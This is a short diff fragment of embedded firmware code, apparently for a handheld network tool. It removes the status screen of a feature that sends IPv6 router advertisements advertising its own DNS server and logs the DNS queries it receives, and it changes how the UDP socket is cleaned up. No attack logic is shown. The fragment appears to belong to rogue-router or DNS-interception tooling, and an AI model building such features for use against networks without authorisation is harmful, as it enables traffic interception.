-        if (!dm.isBlocked() && millis() - lastDraw >= 400) {
-            char b[56]; int y = outputY + LINE_HEIGHT * 2;
-            dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, y); dm.printText("our DNS");
-            dm.setTextColor(TFT_YELLOW);   dm.setCursor(72, y); dm.printText(llShort); y += LINE_HEIGHT + 4;
-            snprintf(b, sizeof(b), "RA sent : %lu (keyid %u)", (unsigned long)raSent, keyid);
-            dm.setTextColor(TFT_GREEN);    dm.setCursor(6, y); dm.printText(b); y += LINE_HEIGHT;
-            snprintf(b, sizeof(b), "DNS rcvd: %lu", (unsigned long)dnsRx);
-            dm.setTextColor(dnsRx ? TFT_GREEN : TFT_DARKGREY); dm.setCursor(6, y); dm.printText(b); y += LINE_HEIGHT + 4;
-            if (lastQ[0]) {
-                dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, y); dm.printText("last:");
-                dm.setTextColor(TFT_CYAN);     dm.setCursor(48, y); dm.printText(lastQ);
-            }
-            dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, 230); dm.printText("[k] keyid   [q] stop");
-            lastDraw = millis();
         }
         vTaskDelay(pdMS_TO_TICKS(10));
     }
 
-    udp.stop();
+    if (dpcb) { LOCK_TCPIP_CORE(); udp_remove(dpcb); UNLOCK_TCPIP_CORE(); }
     if (log) log.close();
     dm.clearScreen(); dm.printCommandScreen();
 }
